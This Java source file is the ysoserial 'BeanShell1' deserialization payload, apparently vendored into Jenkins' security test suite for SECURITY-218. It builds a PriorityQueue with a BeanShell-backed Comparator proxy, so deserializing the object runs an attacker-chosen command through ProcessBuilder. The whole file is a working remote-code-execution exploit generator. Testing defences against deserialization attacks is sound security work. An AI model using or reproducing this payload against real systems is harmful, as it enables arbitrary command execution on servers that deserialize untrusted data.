package jenkins.security.security218.ysoserial.payloads;

import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;
import jenkins.security.security218.ysoserial.payloads.util.Reflections;
import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
    public PriorityQueue getObject(String command) throws Exception {
	// BeanShell payload
	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload);

	// Create InvocationHandler
	XThis xt = new XThis(i.getNameSpace(), i);
	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

	// Create Comparator Proxy
	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	Object[] queue = new Object[] {1,1};
	Reflections.setFieldValue(priorityQueue, "queue", queue);
	Reflections.setFieldValue(priorityQueue, "size", 2);

	return priorityQueue;
    }
 
    public static void main(final String[] args) throws Exception {
	PayloadRunner.run(BeanShell1.class, args);
    }
}
